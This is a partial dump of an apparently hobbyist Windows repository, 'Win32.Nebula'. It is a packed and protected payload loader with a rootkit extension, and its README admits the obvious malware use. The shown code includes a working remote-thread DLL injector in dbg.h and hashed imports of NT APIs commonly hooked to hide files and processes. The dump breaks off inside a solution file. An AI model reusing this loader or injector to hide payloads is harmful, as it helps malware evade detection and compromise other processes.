Project Path: arc_gmh5225_Win32.Nebula_ccj0nkin

Source Tree:

```txt
arc_gmh5225_Win32.Nebula_ccj0nkin
├── README.md
├── Win32.Nebula.sln
├── res
│   ├── Nebula Trace GH.png
│   └── NebulaB24.ico
└── src
    ├── base.h
    ├── dbg.h
    ├── ext
    │   ├── README.md
    │   └── Rootkit
    │       ├── Rootkit.sln
    │       ├── riftrk
    │       │   ├── detour.cpp
    │       │   ├── main.cpp
    │       │   ├── nth.cpp
    │       │   ├── riftrk.vcxproj
    │       │   ├── riftrk.vcxproj.filters
    │       │   └── rk.h
    │       └── rkmgr
    │           ├── main.cpp
    │           ├── mgr.h
    │           ├── rkmgr.vcxproj
    │           └── rkmgr.vcxproj.filters
    ├── riftbld
    │   ├── bld.cpp
    │   ├── bld.h
    │   ├── ioc.cpp
    │   ├── main.cpp
    │   ├── resource.h
    │   ├── riftbld.rc
    │   ├── riftbld.vcxproj
    │   └── riftbld.vcxproj.filters
    ├── riftldr
    │   ├── are.cpp
    │   ├── core.cpp
    │   ├── ldr.cpp
    │   ├── ldr.h
    │   ├── riftldr.vcxproj
    │   ├── riftldr.vcxproj.filters
    │   ├── utl.cpp
    │   └── x64.asm
    ├── scs
    │   └── rc4mod.c
    ├── sdk.h
    └── shr
        ├── itl.h
        ├── nbp.h
        ├── shr.cpp
        ├── shr.vcxitems
        └── shr.vcxitems.filters

```

`README.md`:

```md
# Win32.Nebula
Nebula is a **P**acked and **P**rotected **M**odule **L**oader. (**PPML**)\
Named after a space phenomenon that describes a interstellar cloud.\
(it may internally still be refered to as _rift or rift)

Nebula aims to be able to launch a payload of choice in a protected environment.\
It tries to achive this by using various techniques used to obfuscated and protect code,\
these include well known tricks commonly used in e.g. malware, anticheats and others.\
It serves as an absolute base and will provide a small framework through an SDK and API.\
This Framwork will have basic functionality in order to control the loader from a payload,\
but will be extensible through a dynamic service interface allowing extenstions,
that can be attached to Nebula, to allow registering functions that the payload may use.

This project is currently in development and currently serves as a POC or template to build onto.\
In the future this could be build out into a fully fledged "basic"-protector.

## Components:
Nebula is mainly split into 2 components, the base (loader) and its builder utility.

- The loader will be shiped in the form of a static lib,
  which would be linked into a payload executable by setting it up to be the entrypoint,
  the builder would later finalize the image by obfuscating the rest and properly linking up the functions.

- The builder that is responsible for patching, crypting, packing and generally messing with binaries.\
  It provides the interface for modifying images used by the loader or the loader itself.\
  It serves as a tool to finalize the binary into and turn it into a proper executable image.

## Usage:
Note: This is currently only how it is supposed to be designed at the current state.

Nebula is shipped as a static lib, around max 20kb, with a single header sdk.\
A client can simply code a programm with an by Nebula defined entrypoint and link in the static lib,
(he can either tell the linker to use the lib as an entrypoint or a custom entry that calls the lib entry).

The TlsCallback inside the lib will be responsible for starting and as well as shutting down major functionality of the library,
this also being the reason why the client wont be able to use compiler implemented TLS (doubt it is that important).

The SDK provides an interface that should be used by client code,
(due to it being a static lib the client has full access to internal API's, this is not recommended).\
The SDK exposes through the client entrypoint the major functions for the ServiceManager,
this manager on the other hand exposes all public API's of Nebuala
(it is not limited to manage public API's only tho and can also expose internal private API's used by internals through the service call system).\
The ServiceManager is fully dynamic and allows for Client code as well as plugins to register services as well as unregister them.\
This allows client code to securely access API's with a well defined signature and interface.

A PlugingAPI is also planned allowing to load a packed pluging from a buffer, resource or file into the host process.\
As of now, these Plugins by design will be able to import systemdependencies or dll's normaly,
however they wont be able to import other plugins by design, they are still free to subload plugins.

## Disclaimer:
**Im totally aware that this could be used for malware.**\
It is not meant to be used for malicous intends and should only serve as a learning resource,
demonstration or proof of concept (PoC).

**I do not encourage the spreading of malware for several obvious reasons.\
! THE CREATOR IS NOT RESPONSIBLE FOR ANYTHING DONE USING THIS SOFTWARE !**

### Why did I decide to make this public then ?
The reason is the same as why you can find alot of other open source projects that could be used for malicous purposes.\
Or why you can find books about how rootkits work and how to build them, as well as other stuff.

It serves as a learning resource and most of the techniques contained are already publicly optainable,\
the actual bad guys already have all the knowledge if not even more...

```

`Win32.Nebula.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30711.63
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "riftldr", "src\riftldr\riftldr.vcxproj", "{E7E1AA01-B370-4D91-85B2-93A096AC2F46}"
	ProjectSection(ProjectDependencies) = postProject
		{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749} = {5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}
	EndProjectSection
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "riftbld", "src\riftbld\riftbld.vcxproj", "{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "NebulaInternal", "NebulaInternal", "{6DA0C2E1-1B8D-4F11-A7E0-17645FA965DC}"
	ProjectSection(SolutionItems) = preProject
		src\base.h = src\base.h
		src\dbg.h = src\dbg.h
		src\sdk.h = src\sdk.h
	EndProjectSection
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "shr", "src\shr\shr.vcxitems", "{F510336D-E46A-4EA5-9517-6F97F1822457}"
EndProject
Global
	GlobalSection(SharedMSBuildProjectFiles) = preSolution
		src\shr\shr.vcxitems*{5edaecc5-bb9d-4cdd-abf8-d8c0306a2749}*SharedItemsImports = 4
		src\shr\shr.vcxitems*{e7e1aa01-b370-4d91-85b2-93a096ac2f46}*SharedItemsImports = 4
		src\shr\shr.vcxitems*{f510336d-e46a-4ea5-9517-6f97f1822457}*SharedItemsImports = 9
	EndGlobalSection
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		DebugExecutable|x64 = DebugExecutable|x64
		DebugLibrary|x64 = DebugLibrary|x64
		ReleaseExecutable|x64 = ReleaseExecutable|x64
		ReleaseLibrary|x64 = ReleaseLibrary|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.DebugExecutable|x64.ActiveCfg = DebugExecutable|x64
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.DebugExecutable|x64.Build.0 = DebugExecutable|x64
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.DebugLibrary|x64.ActiveCfg = DebugLibrary|x64
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.DebugLibrary|x64.Build.0 = DebugLibrary|x64
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.ReleaseExecutable|x64.ActiveCfg = ReleaseExecutable|x64
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.ReleaseExecutable|x64.Build.0 = ReleaseExecutable|x64
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.ReleaseLibrary|x64.ActiveCfg = ReleaseLibrary|x64
		{E7E1AA01-B370-4D91-85B2-93A096AC2F46}.ReleaseLibrary|x64.Build.0 = ReleaseLibrary|x64
		{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}.DebugExecutable|x64.ActiveCfg = Debug|x64
		{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}.DebugExecutable|x64.Build.0 = Debug|x64
		{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}.DebugLibrary|x64.ActiveCfg = Debug|x64
		{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}.ReleaseExecutable|x64.ActiveCfg = Release|x64
		{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}.ReleaseExecutable|x64.Build.0 = Release|x64
		{5EDAECC5-BB9D-4CDD-ABF8-D8C0306A2749}.ReleaseLibrary|x64.ActiveCfg = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(NestedProjects) = preSolution
		{F510336D-E46A-4EA5-9517-6F97F1822457} = {6DA0C2E1-1B8D-4F11-A7E0-17645FA965DC}
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {ACC15B3C-7087-4D02-80E9-564C8E08A0C9}
	EndGlobalSection
EndGlobal

```

`src/base.h`:

```h
/* This File serves as the absolute base of the whole project for other headers to build on */
#pragma once

// Disable Useless/Inaccurate Warnings
#pragma warning(disable : 4100)
#pragma warning(disable : 4200)
#pragma warning(disable : 4267)
#pragma warning(disable : 4302)
#pragma warning(disable : 4311)
#pragma warning(disable : 4595)
#pragma warning(disable : 4706)

#pragma region Base
// Language (C/C++) Specific
#if !_NSDK
#define _CRT_SECURE_NO_WARNINGS        // Disables insecure CRT feature warnings (because we dont care)
#define _VCRTIMP __declspec(dllimport) // Shitty hack in order to prevent the compiler from complain about
                                       // C++ overloaded inline functions being "redefined" by importing
#include <intrin.h>                    // Intrinsics (this is redundant as the windows header also includes this)

// Windows (NT) Specific
#define  WIN32_LEAN_AND_MEAN            // Reduce Header Size
#endif
#define _WIN32_WINNT         0x06000000 // Windows Vista and up
#include <windows.h>                    // Windows Header
#include <winternl.h>                   // Windows Internals
#pragma endregion

/* Nebula Specific *///////////////////////////////
// Defines Common/Standard Datatypes used by Nebula
#pragma region Definitions
#pragma region Datatype Declarations
// Standard Types for Strings
typedef          wchar_t   wchar;

// Integer Types
typedef          char      i8;
typedef          short     i16;
typedef          long      i32;
typedef          long long i64;
typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned long      u32;
typedef unsigned long long u64;

// CPU Types
typedef unsigned char      byte;
typedef unsigned short     word;
typedef unsigned long      dword;
typedef unsigned long long qword;

#define _M_X64 1
#define _M_AMD64 1
#define __ia64__ 1

// Pointer Types
#ifdef _M_X64
typedef unsigned long long ptr;    // A pointer as a raw value used for pointer arithmetic (prefered over "void*")
typedef unsigned long long poly;   // A polymorthic scalar type that can be used to store anything fitting
typedef          void*     handle; // A handle is a polymorthic type that stores a reference or value associated to an object
                                   // this value has to be translated and processed by the corresponding api (similar to WinAPI's)
#elif _M_IX86
typedef unsigned long  ptr;
typedef unsigned long  poly;
typedef          void* handle;
#endif
#pragma endregion

#pragma region Standard Macros
#ifdef  _M_X64
#define __x64call
#else
#define __x64call INVALID_CALLING_CONVENTION // This cause a compiler error
#endif

#define null                   0
#define GENERIC_READWRITE      0xc0000000 // (GENERIC_READ | GENERIC_WRITE)
#define MEM_ALLOC              0x00003000 // (MEM_RESERVE | MEM_COMMIT)
#define PAGE_SIZE              0x00001000 // 4096 bytes

#define DEPRECATED             __declspec(deprecated)
#define DEPRECATED_STR(String) __declspec(deprecated(String))

#define IMPORT                 __declspec(dllimport)
#define EXPORT                 __declspec(dllexport)
#define NOINLINE               __declspec(noinline)

#define ALLOC_CODE(Section)    __declspec(code_seg(Section))
#define ALLOC_DATA(Section)    __declspec(allocate(Section))
#pragma endregion
#pragma endregion

#pragma region Status System
/* Defines the Statussystem of Nebula, its Values and Macros
   Guideline:
       All Functions in Nebula that can fail or are required to return data to the caller
       return a value of type "status".
       If a function has to return special info to the caller it can do so through status using MOREINFO
       if the data fits within 30bits (preferably only 24bits (3bytes)),
       else it has to return that data through parameter(s) by reference.

       Fucntions that can NOT fail dont have to return "status" and can instead return nothing (void),
       they can also return a polymorphic type like "poly" or a pointer (preferably void* or ptr).

       NOTE: These Guidelines do not apply to Systemcallbacks from the WinAPI

   Macro Prefixes:
   S_:  Macor's    (Macros to create and evaluate status')
   SS_: Severity   (Describes the State of the function)
   SF_: Facility   (Describes which Part caused the issue)
   SC_: Satus Code (Can be a predifined Value that idicates the problem)

             | Status-Format: (32-Bit Type)                    | Severity Format: (2-Bits)
   ----------+----------+-----------+------------------------- | -------------------------
   Property: | Severity | Facility  | Status Code              | B[1 (31)] : Error-Flag
   Mask:     | BB       | BBBBBB    | BBBBBBBBBBBBBBBBBBBBBBBB | Indicates a Problem
   ----------+----------+-----------+------------------------- | B[0 (30)] : Special-Flag
   Size:     | 2 bits   | 6 bits    | 24 bits    (3 bytes)     | Special treatment needed
   Value:    | 0x3 (4)  | 0x3f (64) | (0xffffff) (16777216)    |                        */
typedef _Success_(!(return & (0b1 << 31))) signed long status;
/* typedef struct _status {
    dword Code     : 24;
    dword Facility :  6;
    dword Severity :  2;
} status, * pstatus;  */
#define SUCCESS 0 // returned by a routine when successful and no further info is provided

#pragma region Severity
#define SS_SUCCESS 0b00 // Indicates a successful execution
#define SS_MESSAGE 0b01 // Return Value format unspecified, depends on the function
                        // (lower 30 bits available for use by the function)

#define SS_ERROR   0b10 // Indicates that the subroutine failed.
#define SS_WARNING 0b11 // Indicates that a subroutine migth have failed partially,
                        // Data might be incomplete and could cause further errors.
#pragma endregion

#pragma region Facility
// Facility-Codes from 0-15 are reserved for Nebula ()
#define SF_NULL    0 // Undefined Facility (can be used anywhere (often used for utility functions))
#define SF_LOADER  1 // Code run inside riftldr at Stage-1 (crypter and protections)
#define SF_CORE    2 // Code from the rift core (Stage-2 Entrypoint: CoreMain)
#define SF_BUILDER 7 // Code from the Build Tool and Patcher (riftbld.exe)

// Facility-Codes 16 - 63 are reserved for the client
#define SF_CLIENT  16 //

#define SF_RKCMGR  16 // Code from the Rootkit Control Manager Extension (rkmgr.ext)
#define SF_ROOTKIT 17 // Code from the Rootkit Module (riftrk.dll)
#pragma endregion

#pragma region Status Codes
#define SC_NULL                0 // No Code Specified (can be used if no errorinformation is available, should be used when SS_SUCCESS)
#define SC_UNKNOWN             1 // A unknown issue occurred
#define SC_THREAD_DIED         2 // A important Asynchronous Thread died prematurely
#define SC_INVALID_PARAMETER   3 // A Parameter of a Functioncall was Invalid
#define SC_UNHANDLED           4 // A request remains unhandled
#define SC_SEARCH_UNSUCCESSFUL 5 // A search that was attempted failed or found no result
#define SC_INVALID_POINTER     6 // Pointer to Object is invalid (NullPointer)
#define SC_INVALID_DATA        7 // Invalid/Malformed data was found
#define SC_UNSUPPORTED         8 // A unsupported feature was requested
#define SC_INVALID_HANDLE      9 // A invalid handle was found/translated
#define SC_COULDNT_ATTACH     10 // Could not attach to protocol
#define SC_INCOMPLETE         11 // Opearation remains incomplete
#define SC_INVALID_SIZE       12 // Invalid size parameter
#define SC_INVALID_COMMAND    13 // An invalid command was requested
#define SC_NOT_FOUND          14 // The element searched for was not found
#define SC_ALREADY_EXISTS     15 // Object already exists
#define SC_INVALID_SIGNATURE  16 // A signature to validate an object did not match
#define SC_UNKNOWN_DATA_FOUND 17 // Unexpected and unknown data was found
#define SC_MISMATCH           18 // Data did not match with what was expected
#define SC_CRITICAL_FAILURE   19 // Undefined critical error occured
#define SC_FATAL_ERROR        20 // Programm state corrupted, can NOT continue
#define SC_INSUFFICIENT       21 // Insufficient Privileges
#define SC_COUNTER_CORRUPTED  22 // A counter was Over/Under -flown and is corrupted
#define SC_TOO_LONG           23 // A object is to long to fit inside a buffer

#define SC_CLIENT 65536 // Status Codes from 65536 (0x10000) - 16777216 (0xffffff) are reserved for the Client
#pragma endregion

#pragma region Status Macros
#define S_SEVERITY(s)  (s >> 30)           // Gets the Serverity Flags
#define S_FACILITY(s)  ((s >> 24) & 0x3f)  // Gets the Facility Id
#define S_CODE(s)      (s & 0xffffff)      // Gets the Statuscode
#define S_MESSAGE(s)   (s & 0x3fffffff)    // Gets the Message

#define S_SUCCESS(s)   !(s >> 31)          // Checks if status idicates no Issues (neither an Error nor Warning)
#define S_WARNING(s)   ((s >> 30) == 0b11) // Checks if status idicates an Warning
#define S_ERROR(s)     ((s >> 30) == 0b10) // Checks if status idicates an Error
#define S_ISMESSAGE(s) ((s >> 30) == 0b01) // Checks if status is a function specific message
// #define S_ISSUE(s)     (s >> 31)           // Checks if status Idicates an Issue (this includes Errors)

// Used to generate a Status
#define S_CREATE(Severity, Facility, Code) ((Severity << 30) |\
                                           ((Facility & 0x3f) << 24) |\
                                           (Code & 0xffffff))

// Used to convert function defined data to a status of type S_MESSAGE
#define S_CREATEM(Data) (SS_MESSAGE << 30 |\
                         Data & 0x3fffffff)
#pragma endregion
#pragma endregion


// The Macroprefix "N_" is reserved for Nebula's usage
#pragma region Import FNV-1a Hashes
#define N_NTDLL     0xfd96b5caa3a9c6d9 // L"ntdll.dll"
#define N_NTQUERYSI 0xcac033026619e14a // "NtQuerySystemInformation"
#define N_NTQUERYDF 0x9859ea27eda9b57e // "NtQueryDirectoryFile"
#define N_RTLCOMBUF 0x2f3a7db33e2ae08b // "RtlCompressBuffer"
#define N_RTLDECBUF 0xf4e7dfe9f97daee1 // "RtlDecompressBufferEx"
#define N_RTLCOMWWS 0x2f4628d5a07bd77d // "RtlGetCompressionWorkSpaceSize"
#define N_RTLRANDEX 0xa12ac26abe63b26f // "RtlRandomEx"
#define N_NTQUERYVM 0x8ef72532eaeee49f // "NtQueryVirtualMemory"
// #define N_CRTWCSCAT 0x48400801361a0cf8 // "wcscat"
// #define N_CRTWCSLWR 0x830509af3f20a316 // "_wcslwr"

// Nebula Hashses:
#define N_ADDEXCLUS 0x165dc6731b1c1c81 // "AddMemoryRegionExclusion"
#define N_REMEXCLUS 0x10e5c1ef8abb14e2 // "RemoveMemoryRegionExclusion"
#define N_SCANVASPC 0xabd01abea3896cb0 // "ScanUserModeVirtualMemory"


// Kernel32 will likely never beused as ntdll is prefered for all hidden functions
#define N_KRNL32DLL 0x7f1bf8b449d16c2d // L"kernel32.dll"

#if 0 // Bcrypts usage has been stripped from the project, reasons:
      // 1. usign aes or sha for anything here is just too overkill
      // 2. It would require to import another library
      // 3. In order to hide shit properly the Imports all would have to be Dynamic
      // 4. Hashed Imports are fast but still alot slower compared to nt!LdrXxx
      // 5. Same Reasons as why im not using cabinet (bcrypt doesnt support all features on all platforms)
      //    Nebula is meant to work on all nt6 systems, so i prefer to just do shit myself instead
#define N_BCRYPTDLL 0x589716db3c6ad2b1 // L"bcrypt.dll"
#define N_BCCALGPRO 0xd05325edc3942847 // "BCryptCloseAlgorithmProvider"
#define N_BCCREHASH 0xd577120aeac34017 // "BCryptCreateHash"
#define N_BCDECRYPT 0xe813f52a0c1eb360 // "BCryptDecrypt"
#define N_BCDESHASH 0x1256b5291ddc435f // "BCryptDestroyHash"
#define N_BCDESTKEY 0x456e49222c4e5716 // "BCryptDestroyKey"
#define N_BCENCRYPT 0x7cfbe1a0e01ab5e4 // "BCryptEncrypt"
#define N_BCEXPORTK 0xd7a3e1547e22b7a4 // "BCryptExportKey"
#define N_BCFINHASH 0xbd0e01391378b228 // "BCryptFinishHash"
#define N_BCGENSYMK 0xd0258dee7a62b6ba // "BCryptGenerateSymmetricKey"
#define N_BCGENRAND 0x81b17a4c9b61eeac // "BCryptGenRandom"
#define N_BCGETPROP 0xded8482b3d5effb4 // "BCryptGetProperty"
#define N_BCHASHDAT 0x96d6540c2cfbfbf7 // "BCryptHashData"
#define N_BCIMPORTK 0x6fd72c3b719e9b35 // "BCryptImportKey"
#define N_BCOALGPRO 0x1e7273483b28159d // "BCryptOpenAlgorithmProvider"
#define N_BCSETPROP 0xaf4ca6dc1939de68 // "BCryptSetProperty"
#endif
#pragma endregion

```

`src/dbg.h`:

```h
/* Debug Library: Defines debugging related code used to debug, trace/log and test code,
                  all contianed within one header as a almost standalone library,
				  that is mutually excluded in non debug builds. */
#pragma once
#pragma comment(lib, "ntdllp.lib")
#include <windows.h>
#pragma comment(lib, "dbghelp.lib")
#include <dbghelp.h>

#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllimport) ULONG __stdcall vDbgPrintEx(_In_ ULONG ComponentId, _In_ ULONG Level, _In_z_ PCCH Format, _In_ va_list arglist);
	__declspec(dllimport) int __cdecl swprintf_s(wchar_t* buffer, size_t sizeOfBuffer, const wchar_t* format, ...);
	__declspec(dllimport) int __cdecl vsprintf_s(char* buffer, size_t numberOfElements, const char* format, va_list argptr);
#ifdef __cplusplus
}
#endif

inline long DbgCreateDump(                             // Generates a MiniDumpFile of the current process
	_In_opt_z_ const wchar_t*            Path,         // The path at which to create the dumpfile and write to
	_In_opt_         EXCEPTION_POINTERS* ExceptionInfo // Optional exceptionpointers incase an exception occoured
) {
	auto Heap = GetProcessHeap();
	auto ModuleFile = (wchar_t*)HeapAlloc(Heap, 0, MAX_PATH);
	if (!ModuleFile)
		return -1;

	// Search for Basename
	GetModuleFileNameW(GetModuleHandleW(nullptr), ModuleFile, MAX_PATH);
	size_t StringLength = wcslen(ModuleFile);
	auto BaseName = ModuleFile + StringLength;
	while (*--BaseName != L'\\');

	// Create Dumpfile
	auto TargetFile = (wchar_t*)HeapAlloc(Heap, 0, MAX_PATH);
	if (!TargetFile)
		return -5;

	auto AppandingOffset = 0;
	if (Path) {
		wcscpy(TargetFile, Path);
		AppandingOffset = wcslen(Path);
		TargetFile[AppandingOffset++] = L'\\';
	}
	swprintf_s(TargetFile + AppandingOffset, MAX_PATH, L"%s%04d_%#018llx.dmp", ++BaseName, GetCurrentProcessId(), __rdtsc());
	HeapFree(Heap, 0, ModuleFile);
	handle hFile = CreateFileW(TargetFile, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ, nullptr, CREATE_ALWAYS, NULL, NULL);
	HeapFree(Heap, 0, TargetFile);
	if (hFile == INVALID_HANDLE_VALUE)
		return -2;

	// Create and Write Minidump
	MINIDUMP_EXCEPTION_INFORMATION mdei;
	mdei.ExceptionPointers = ExceptionInfo;
	mdei.ThreadId = GetCurrentThreadId();
	mdei.ClientPointers = false;
	MiniDumpWriteDump(GetCurrentProcess(), GetCurrentProcessId(),
		hFile, MiniDumpNormal, &mdei, nullptr, nullptr);

	CloseHandle(hFile);
	return 0;
}

#ifdef _DEBUG
#define DBG_ERROR   0 //
#define DBG_WARNING 1 //
#define DBG_SUCCESS 2 //
#define DBG_INFO 3 //
inline void DbgTracePoint(
	_In_opt_ u32         ErrorLevel,
	_In_z_   const char* FormatString,
	_In_opt_             ...
) {
	auto Buffer = (char*)VirtualAlloc(nullptr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!Buffer)
		__debugbreak();
	auto Iterator = Buffer;

	// Print errorlevel symbol
	*Iterator++ = '[';
	switch (ErrorLevel) {
	case DBG_ERROR:   *Iterator++ = 'X'; break;
	case DBG_WARNING: *Iterator++ = '!'; break;
	case DBG_SUCCESS: *Iterator++ = 'S'; break;
	case DBG_INFO: *Iterator++ = '+';
	}
	*Iterator++ = ']'; *Iterator++ = ' ';

	// Generate alligned Buffer
	while (*FormatString) {
		*Iterator++ = *FormatString;
		if (*FormatString++ == '\n') {
			for (auto i = 0; i < 4; i++)
				*Iterator++ = ' ';
		};
	}
	*Iterator = '\n'; // Auto Newline

	// Print Message
	va_list Arguments;
	va_start(Arguments, FormatString);
	vDbgPrintEx(0x65, ErrorLevel, Buffer, Arguments);
	va_end(Arguments);

	VirtualFree(Buffer, 0, MEM_RELEASE);
}
#endif

#if defined(_DEBUG) && defined(__cplusplus)
// will be renamed to dbg when the original old code has been fully regfactored modified
// Old Code, will be fixed up, refactored, moved to dbg2 or removed
namespace dbg {
#pragma region Intermediate/Developmental Debugging
	class DbgBenchmark {
	public:
		typedef void nul;
		enum class Resolution : u32 {
			SEC = 1,
			MILLI = 1000,
			MICRO = 1000000,
			NANO = 1000000000
		};

		DbgBenchmark(
			_In_ Resolution res = Resolution::MILLI
		)
		#ifdef _DEBUG
			: m_res(res) {
			if (!m_liFrequenzy.QuadPart)
				QueryPerformanceFrequency(&m_liFrequenzy);
		#else
			{
		#endif
			}

		void Begin() {
		#ifdef _DEBUG
			QueryPerformanceCounter(&m_liBegin);
		#endif
		}
		u64 End() {
		#ifdef _DEBUG
			QueryPerformanceCounter(&m_liEnd);

			// Calculate time difference, whole and part
			m_liEnd.QuadPart -= m_liBegin.QuadPart;
			u64 Whole = (m_liEnd.QuadPart / m_liFrequenzy.QuadPart) * (u64)m_res;
			u64 Part = (m_liEnd.QuadPart % m_liFrequenzy.QuadPart) * (u64)m_res;
			Part /= m_liFrequenzy.QuadPart;

			return Whole + Part;
		#endif
		}

	private:
	#ifdef _DEBUG
		static LARGE_INTEGER m_liFrequenzy;
		const  Resolution    m_res;
		       LARGE_INTEGER m_liBegin;
		       LARGE_INTEGER m_liEnd;
	#endif
		};
	inline LARGE_INTEGER DbgBenchmark::m_liFrequenzy;

	class DbgLog {
	public:
		static DbgLog& Instance() {
			static DbgLog instance;
			return instance;
		}

		void Trace(
			_In_     const char* sz,
			_In_opt_             ...
		) {
			__try {
				char* psz = (char*)VirtualAlloc(nullptr, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
				if (!psz)
					return;

				size_t nLen;
				// Format if needed
					va_list va;
					va_start(va, sz);
					vsprintf_s(psz, 0x1000, sz, va);
					va_end(va);
					nLen = strlen(psz);

				if (psz[nLen] != '\n')
					*(u16*)&psz[nLen] = '\0\n';
				WriteToLog(psz, nLen + 1);
				VirtualFree((void*)psz, NULL, MEM_RELEASE);
			} __except (RecursiveException(GetExceptionInformation())) {}
		}

	private:
		DbgLog() {
			m_hFile = CreateFileW(L"rift.log", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ,
				nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			PTOP_LEVEL_EXCEPTION_FILTER uef = [](EXCEPTION_POINTERS* ctx) -> long {
				auto log = Instance();
				log.Trace("Unhandled Exception caught! @: %#018x, Exception:%#018x",
					ctx->ExceptionRecord->ExceptionAddress, ctx->ExceptionRecord->ExceptionCode);
				CloseHandle(log.m_hFile);

				return EXCEPTION_CONTINUE_SEARCH;
			};
			SetUnhandledExceptionFilter(uef);

			PVECTORED_EXCEPTION_HANDLER veh = [](EXCEPTION_POINTERS* ctx) -> long {
				Instance().Trace("Exception occurred! @: %#018x, Exception:%#018x\nTrying to resume Execution.",
					ctx->ExceptionRecord->ExceptionAddress, ctx->ExceptionRecord->ExceptionCode);

				return EXCEPTION_CONTINUE_SEARCH;
			};
			AddVectoredExceptionHandler(NULL, veh);
		}
		~DbgLog() {
			CloseHandle(m_hFile);
		}

		static status WriteToLog(
			_In_ handle h,
			_In_ void* pBuf,
			_In_ size_t nBuf
		) {
			u32 dw;
			if (WriteFile(h, pBuf, nBuf, &dw, nullptr))
				return dw;
			return -1;
		}
		status WriteToLog(
			_In_ void* pBuf,
			_In_ size_t nBuf
		) {
			return WriteToLog(m_hFile, pBuf, nBuf);
		}

		static long RecursiveException(EXCEPTION_POINTERS* ctx) {
			handle hFile = DbgLog::Instance().m_hFile;
			WriteToLog(hFile, (char*)"\nRecursive Exception occurred!\n"
				"Can't continue search/execution, aborting Process", 80);
			CloseHandle(hFile);
			__fastfail(ctx->ExceptionRecord->ExceptionCode);
			return 0; // doesn't matter as we fastfail before anyways, but is needed to make the compiler happy.
		}


		handle m_hFile;
	};
#pragma endregion


#pragma region Utility Debugging
	// Temporery DllInjector, this allows for JIT debugging which manualmapping can't really do
	inline status InjectDllW(
		_In_z_ const wchar* szDll,
		_In_         u32    dwPid
	) {
		handle hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
		if (!hProc)
			return -1; // Failed to open target Process

		void* rpDllPath = VirtualAllocEx(hProc, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (!rpDllPath)
			return -2; // Failed to allocate remote Memory
		if (!WriteProcessMemory(hProc, rpDllPath, szDll, wcslen(szDll), NULL))
			return -3; // Failed to write to remote Memory

		void* pLoadLibraryW = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
		if (!pLoadLibraryW)
			return -4; // Failed to get Loaderfunctionaddress
		handle hRemoteThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, rpDllPath, NULL, NULL);
		if (!hRemoteThread)
			return -5; // Failed to create remote Thread

		WaitForSingleObject(hRemoteThread, INFINITE);
		u32 dwRemote;
		GetExitCodeThread(hRemoteThread, &dwRemote);

		CloseHandle(hRemoteThread);
		VirtualFreeEx(hProc, rpDllPath, 0, MEM_RELEASE);
		CloseHandle(hProc);
		return dwRemote;
	}
#pragma endregion
}
#endif

#define BreakPoint   __debugbreak
#define CreateDump   DbgCreateDump
#ifdef _DEBUG
#define TracePoint   DbgTracePoint
#else
#define TracePoint()
#endif

```

`src/ext/Rootkit/Rootkit.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.30804.86
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "rkmgr", "rkmgr\rkmgr.vcxproj", "{2C1D9272-9A62-4169-A851-58E4E6BA53AE}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "riftrk", "riftrk\riftrk.vcxproj", "{DE4F0368-CFE8-463E-95EE-DCED67FCCD3B}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x32 = Debug|x32
		Debug|x64 = Debug|x64
		Release|x32 = Release|x32
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{2C1D9272-9A62-4169-A851-58E4E6BA53AE}.Debug|x32.ActiveCfg = Debug|x64
		{2C1D9272-9A62-4169-A851-58E4E6BA53AE}.Debug|x64.ActiveCfg = Debug|x64
		{2C1D9272-9A62-4169-A851-58E4E6BA53AE}.Debug|x64.Build.0 = Debug|x64
		{2C1D9272-9A62-4169-A851-58E4E6BA53AE}.Release|x32.ActiveCfg = Release|x64
		{2C1D9272-9A62-4169-A851-58E4E6BA53AE}.Release|x64.ActiveCfg = Release|x64
